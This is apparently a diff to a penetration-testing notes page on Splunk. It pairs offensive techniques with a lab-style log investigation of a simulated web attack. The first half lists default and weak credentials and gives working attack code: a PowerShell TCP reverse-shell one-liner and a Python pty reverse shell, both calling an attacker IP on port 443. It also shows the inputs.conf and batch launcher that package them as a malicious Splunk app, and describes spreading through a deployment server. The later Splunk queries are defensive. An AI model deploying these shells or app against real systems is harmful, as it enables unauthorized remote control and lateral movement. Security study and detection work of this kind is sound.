@@ -1,8 +1,17 @@
 # 8089 - Splunk
+## Discovery & Enumeration
+>Splunk is a log analytics tool used to gather, analyze and visualize data. Though not originally intended to be a SIEM tool, Splunk is often used for security monitoring and business analytics.
 
-## RCE
+The Splunk web server runs by default on port 8000. On older versions of Splunk, the default credentials are `admin:changeme`.If the default credentials do not work, it is worth checking for common weak passwords such as `admin`, `Welcome`, `Welcome1`, `Password123`, etc.
 
+The Splunk Enterprise trial converts to a free version after 60 days, which doesn’t require authentication.
 
+Splunk has multiple ways of running code, such as server-side Django applications, REST endpoints, scripted inputs, and alerting scripts.
+
+Aside from this built-in functionality, Splunk has suffered from various public vulnerabilities over the years, such as this [SSRF](https://www.exploit-db.com/exploits/40895) that could be used to gain unauthorized access to the Splunk REST API.
+## Attacking
+
+### RCE
 ```bash
 https://book.hacktricks.xyz/network-services-pentesting/8089-splunkd
 https://www.hackingarticles.in/penetration-testing-on-splunk/
@@ -12,4 +21,276 @@ https://github.com/cnotin/SplunkWhisperer2
 # Against Linux target (remotely)
 python PySplunkWhisperer2_remote.py --host 192.168.0.0 --lhost 192.168.0.1 --username user --password pass --payload "revshell"
 ```
+### Abusing Built-In Functionality
+We can use [this](https://github.com/0xjpuff/reverse_shell_splunk) Splunk package to assist us. The `bin` directory in this repo has examples for [Python](https://github.com/0xjpuff/reverse_shell_splunk/blob/master/reverse_shell_splunk/bin/rev.py) and [PowerShell](https://github.com/0xjpuff/reverse_shell_splunk/blob/master/reverse_shell_splunk/bin/run.ps1). Let's walk through this step-by-step.
+
+To achieve this, we first need to create a custom Splunk application using the following directory structure.
+```sh
+tree splunk_shell/
+splunk_shell/
+├── bin
+└── default
+2 directories, 0 files
+# bin -> contain any scripts that we intend to run (in this case, a PowerShell reverse shell)
+# default -> have our `inputs.conf` file
+
+# Our reverse shell will be a PowerShell one-liner.
+#A simple and small reverse shell. Options and help removed to save space. 
+#Uncomment and change the hardcoded IP address and port number in the below line. Remove all help comments as well.
+$client = New-Object System.Net.Sockets.TCPClient('10.10.14.15',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
+
+https://docs.splunk.com/Documentation/Splunk/latest/Admin/Inputsconf
+# The inputs.conf file tells Splunk which script to run and any other conditions. Here we set the app as enabled and tell Splunk to run the script every 10 seconds. The interval is always in seconds, and the input (script) will only run if this setting is present.
+cat inputs.conf 
+[script://./bin/rev.py]
+disabled = 0  
+interval = 10  
+sourcetype = shell 
+
+[script://.\bin\run.bat]
+disabled = 0
+sourcetype = shell
+interval = 10
+
+
+# We need the .bat file, which will run when the application is deployed and execute the PowerShell one-liner.
+@ECHO OFF
+PowerShell.exe -exec bypass -w hidden -Command "& '%~dpn0.ps1'"
+Exit
+
+# Once the files are created, we can create a tarball or .spl file.
+tar -cvzf updater.tar.gz splunk_shell/
+splunk_shell/
+splunk_shell/bin/
+splunk_shell/bin/rev.py
+splunk_shell/bin/run.bat
+splunk_shell/bin/run.ps1
+splunk_shell/default/
+splunk_shell/default/inputs.conf
+
+# Final step is go to Splunk > Apps > + Find more apps > Apps > Manage Apps > Install app from file > Select our tarball file > Upload
+```
+If we were dealing with a **Linux** host, we would need to edit the `rev.py` Python script before creating the tarball and uploading the custom malicious app. The rest of the process would be the same, and we would get a reverse shell connection on our Netcat listener and be off to the races.
+```python
+import sys,socket,os,pty
+
+ip="10.10.14.15"
+port="443"
+s=socket.socket()
+s.connect((ip,int(port)))
+[os.dup2(s.fileno(),fd) for fd in (0,1,2)]
+pty.spawn('/bin/bash')
+```
+If the compromised Splunk host is a deployment server, it will likely be possible to achieve RCE on any hosts with Universal Forwarders installed on them. To push a reverse shell out to other hosts, the application must be placed in the `$SPLUNK_HOME/etc/deployment-apps` directory on the compromised host. In a Windows-heavy environment, we will need to create an application using a PowerShell reverse shell since the Universal forwarders do not install with Python like the Splunk server.
+
+### Detect Suspicious Web Commands
+`index=windows_apache_access (cmd.exe OR powershell OR "powershell.exe" OR "Invoke-Expression") | table _time host clientip uri_path uri_query status`
+### Looking for Errors
+`index=windows_apache_error ("cmd.exe" OR "powershell" OR "Internal Server Error")`
+### Trace Suspicious Process Creation From Apache
+Let’s explore Sysmon for other malicious executable files that the web server might have spawned. We will do that using the following Splunk query:
+`index=windows_sysmon ParentImage="*httpd.exe"`
+This query focuses on **process relationships** from Sysmon logs, specifically when the **parent process is Apache** (`httpd.exe`).
+### Confirm Attacker Enumeration Activity
+`index=windows_sysmon *cmd.exe* *whoami*`
+### Identify Base64-Encoded PowerShell Payloads
+`index=windows_sysmon Image="*powershell.exe" (CommandLine="*enc*" OR CommandLine="*-EncodedCommand*" OR CommandLine="*Base64*")`
+If your defences are correctly configured, this query should return **no results**, meaning any encoded payload never ran.
+
+
+## Exploring the Logs
+
+In the Splunk instance, the data has been pre-ingested for us to investigate the incident. On the Splunk interface, click on **Search & Reporting** on the left panel, as shown below:
+
+![The Splunk interface highlighting the Search & Reporting tab](../../assets/image_159.png)
+
+On the next page, type `index=main` in the search bar to show all ingested logs. Note that we will need to select `All time` as the time frame from the dropdown on the right of the search bar.
+
+![Splunk Search head interface showing the index=main results](../../assets/image_160.png)
+
+After running the query, we will be presented with two separate datasets that have been pre-ingested into Splunk. We can verify this by clicking on the `sourcetype` field in the fields list on the left of the page.
+
+![Splunk interface pointing to sourcetype field results](../../assets/image_161.png)
+
+The two datasets are as follows:
+
+- `web_traffic`: This data source contains events related to web connections to and from the web server.
+- `firewall_logs`: This data source contains the firewall logs, showing the traffic allowed or blocked. The local IP assigned to the web server is `10.10.1.15`.
+
+Let's explore the logs and investigate the attack on our servers to identify the culprit.
+
+## Initial Triage
+
+Start a basic search across the index using your custom source type `web_traffic`, using the following query:
+
+**Search query**: `index=main sourcetype=web_traffic`
+
+![Splunk interface explaining the search head features like timespan, fields, event details](../../assets/image_162.png)
+
+Let's break down our result for a better understanding:
+
+1. **Search query:** This query retrieves all events from the `main` index that were tagged with the custom source type `web_traffic`. This marks the beginning of the investigation.
+2. **Time range:** The time range is currently set to **"All time"**. In security analysis, this range would be tightened (e.g., to the spike window) after initial data loading.
+3. **Timeline:** This visual histogram shows the distribution of the **17,172 events** over time. The graph indicates the successful **daily log volume** followed by a distinctive **traffic spike** (a period of high activity, likely the attack window).
+4. **Selected fields:** These are the fields currently chosen to be displayed in the summary column of the event list (`host`, `source`, `sourcetype`). They represent basic metadata about the log file itself.
+5. **Interesting fields:** This pane lists all fields that Splunk has automatically extracted or manually added. Fields prefixed with `#` (e.g., `#date_hour`) are automatically generated by Splunk's time commands. The presence of `user_agent`, `path`, and `client_ip` confirms the successful parsing of the web log structure.
+6. **Event details & field extraction:** This section shows the parsed details of a single event with extracted fields like `user_agent`, `path`, `status`, `client_ip`, and more.
+
+Now that we have an understanding of the Splunk layout and how to read the logs in Splunk. Let's continue our analysis of the logs.
+
+## Visualizing the Logs Timeline
+
+Let's chart the total event count over time, grouped by day, to determine the number of events captured per day. This will help us in identifying the day that received an abnormal number of logs.
+
+**Search query:** `index=main sourcetype=web_traffic | timechart span=1d count`
+
+![Shows the count of the events per day](../../assets/image_163.png)
+
+The above results are now showing the event logs captured per day. This could be interesting, as we can see some days getting a high volume of logs. We can also click on the `Visualization` tab to examine the graph for better representation, as shown below:
+
+![Shows the visualization graph for the timechart command](../../assets/image_164.png)
+
+We can append the `reverse` function at the end to display the result in descending order, showing the day with the maximum number of events at the beginning. 
+
+**Search query:** `index=main sourcetype=web_traffic | timechart span=1d count | sort by count | reverse` 
+
+![Shows the same result but in reverse order using the reverse function](../../assets/image_165.png)
+
+There is a clear period of intense activity during which King Malhare launched his main attack phase.
+
+## Anomaly Detection
+
+Now that we have examined the days with the abnormal logs, using the table and the graph, let's use the same search query to examine various fields to hunt for suspicious values. We need to go back to the **Events** tab to continue.
+
+**User Agent**
+
+Let's click on the `user_agent` field in the left panel, as shown below. It will show us the details about the user agents captured so far. 
+
+![This image points to the user agent field with suspicious user agents](../../assets/image_166.png)
+
+Upon closer examination, it becomes clear that, apart from legitimate user agents like Mozilla's variants, we are receiving a large number of suspicious ones, which we will need to investigate further.
+
+**client_ip**
+
+The second field we will examine is the `client_ip`, which contains the IP addresses of the clients accessing the web server. We can immediately see one particular IP address standing out, which we will investigate further.
+
+![Shows the client IP results](../../assets/image_167.png)
+
+**path**
+
+The third field we will examine is path, which contains the URI being requested and accessed by the client IPs. The results shown below clearly indicate some attacks worth investigating.
+
+![This image points to the path field with various values](../../assets/image_168.png)
+
+## Filtering out Benign Values
+
+We know King Malhare's bunnies use scripts and tools, not standard browsers. Let's filter out all standard traffic.
+
+Let's exclude common legitimate user agents. The following query will remove legitimate user agents from the results and only show the suspicious ones, which we will further investigate.
+
+**Search query:** `index=main sourcetype=web_traffic user_agent!=*Mozilla* user_agent!=*Chrome* user_agent!=*Safari* user_agent!=*Firefox*`
+
+![Image points to the client IP values after excluding legit user agents](../../assets/image_169.png)
+
+The output reveals interesting results. By clicking on the `client_ip` field we can see a single IP address being responsible for all the suspicious user agents. Let's note that down for further investigation and fill in the `<REDACTED>` portions of the upcoming queries with that IP.
+
+## Narrowing Down Suspicious IPs
+
+In real-world scenarios, we often encounter various IP addresses constantly attempting to attack our servers. To narrow down on the IP addresses that do not send requests from common desktop or mobile browsers, we can use the following query:
+
+**Search query:** `sourcetype=web_traffic user_agent!=*Mozilla* user_agent!=*Chrome* user_agent!=*Safari* user_agent!=*Firefox* | stats count by client_ip | sort -count | head 5`
+
+![Image points to the client IP values after excluding legit user agents](../../assets/image_170.png)  
+The result confirms the top IP used by the Bandit Bunnies. In the search query, the `-` in the `sort -count` part will sort the result by count in reverse order, it's the same as using the reverse function. Let's pick this IP address and filter out to see what the footprints of the activities captured.
+
+## Tracing the Attack Chain
+
+We will now focus on the selected attacker IP to trace their steps chronologically, confirming the use of multiple tools and payloads. Don’t forget to replace `<REDACTED>` with the IP we noted down previously.
+
+**Reconnaissance (Footprinting)**
+
+We will start searching for the initial probing of exposed configuration files using the query below:
+
+**Search query:** `sourcetype=web_traffic client_ip="<REDACTED>" AND path IN ("/.env", "/*phpinfo*", "/.git*") | table _time, path, user_agent, status`
+
+![Shows reconnaissance attempts in the logs](../../assets/image_171.png)
+
+The result confirms the attacker used low-level tools (`curl`, `wget`) and was met with **404/403/401** status codes.
+
+**Enumeration (Vulnerability Testing)**
+
+Search for common path traversal and open redirect vulnerabilities.
+
+**Search query**: `sourcetype=web_traffic client_ip="<REDACTED>" AND path="*..*" OR path="*redirect*"`
+
+![The image shows the vulnerability scaning attempts](../../assets/image_172.png)
+
+The output shows the resources the attacker is trying to access. Let's update the search query to get the count of the resources requested by the attacker. This search query is filtering on the paths that contain either `../../` or the term `redirect` in it, as shown below. This is done to look for footprints of path traversal attempts (`../../`). To, we need to update in the search query to escape the characters like `..\/..\/`.
+
+**Search query**: `sourcetype=web_traffic client_ip="<REDACTED>" AND path="*..\/..\/*" OR path="*redirect*" | stats count by path`
+
+![Results show footprints of data exfiltration attempt](../../assets/image_173.png)
+
+Quite interesting results. Reveals attempts to read system files (`../../*`), showing the attacker moved beyond simple scanning to active vulnerability testing.
+
+**SQL Injection Attack**
+
+Find the automated attack tool and its payload by using the query below:
+
+**Search query:** `sourcetype=web_traffic client_ip="<REDACTED>" AND user_agent IN ("*sqlmap*", "*Havij*") | table _time, path, status`
+
+![Results show footprints of SQL injection in the logs](../../assets/image_174.png)
+
+Above results confirms the use of known SQL injection and specific attack strings like `SLEEP(5)`. A **504** status code often confirms a successful time-based SQL injection attack.
+
+## Exfiltration Attempts
+
+Search for attempts to download large, sensitive files (backups, logs). We can use the query below:
+
+**Search query:** `sourcetype=web_traffic client_ip="<REDACTED>" AND path IN ("*backup.zip*", "*logs.tar.gz*") | table _time path, user_agent`
+
+![Result show footprints of exfiltration attempts](../../assets/image_175.png)
+
+The results indicate the attacker was exfiltrating large chunks of compressed log files using tools like `curl`, `zgrab`, and more. We can confirm the details about these connections in the firewall logs.
+
+## Ransomware Staging & RCE
+
+Requests for sensitive archives like `/logs.tar.gz` and `/config` indicate the attacker is gathering data for double-extortion. In the logs, we identified some requests related to bunnylock and shell.php. Let's use the following query to see what those search queries are about.
+
+**Search query:** `sourcetype=web_traffic client_ip="<REDACTED>" AND path IN ("*bunnylock.bin*", "*shell.php?cmd=*") | table _time, path, user_agent, status`
+
+![Result shows footprints of Data Staging attempts](../../assets/image_176.png)
+
+Above results clearly confirm a successful webshell. The attacker has gained full control over the web server and is also able to run commands. This type of attack is called Remote code Execution (RCE). The execution of `/shell.php?cmd=./bunnylock.bin` indicates a ransomware like program executed on the server. 
+
+## Correlate Outbound C2 Communication
+
+We pivot the search to the `firewall_logs` using the **Compromised Server IP** (`10.10.1.5`) as the source and the attacker IP as the destination.
+
+**Search query:** `sourcetype=firewall_logs src_ip="10.10.1.5" AND dest_ip="<REDACTED>" AND action="ALLOWED" | table _time, action, protocol, src_ip, dest_ip, dest_port, reason`
+
+![Image shows correlation of C2 communication in firewall logs](../../assets/image_177.png)
+
+This query proves the server immediately established an **outbound** connection to the attacker's C2 IP on the suspicious `DEST_PORT`. The `ACTION=ALLOWED` and `REASON=C2_CONTACT` fields confirm the malware communication channel was active.
+
+## Volume of Data Exfiltrated
+
+We can also use the sum function to calculate the sum of the bytes transferred, using the bytes_transferred field, as shown below:
+
+**Search Query:** `sourcetype=firewall_logs src_ip="10.10.1.5" AND dest_ip="<REDACTED>" AND action="ALLOWED" | stats sum(bytes_transferred) by src_ip`
+
+![Result shows data exfiltrated to C2 server](../../assets/image_178.png)
+
+The results show a hugh volume of data transferred from the compromised webserver to C2 server.
+
+## Conclusion
+
+- **Identity found:** The attacker was identified via the highest volume of malicious web traffic originating from the external IP.
+- **Intrusion vector:** The attack followed a clear progression in the web logs (`sourcetype=web_traffic`).
+- **Reconnaissance:** Probes were initiated via cURL/Wget, looking for configuration files (`/.env`) and testing path traversal vulnerabilities.
+- **Exploitation:** The use of `SQLmap` user agents and specific payloads (`SLEEP(5)`) confirmed the successful exploitation phase.
+- **Payload delivery:** The Action on Objective was established by the final successful execution of the command `cmd=./bunnylock.bin` via the webshell.
+- **C2 confirmation:** The pivot to the firewall logs (`sourcetype=firewall_logs`) proved the post-exploitation activity. The internal, compromised server (`SRC_IP: 10.10.1.5`) established an outbound C2 connection to the attacker's IP.
+
+
 
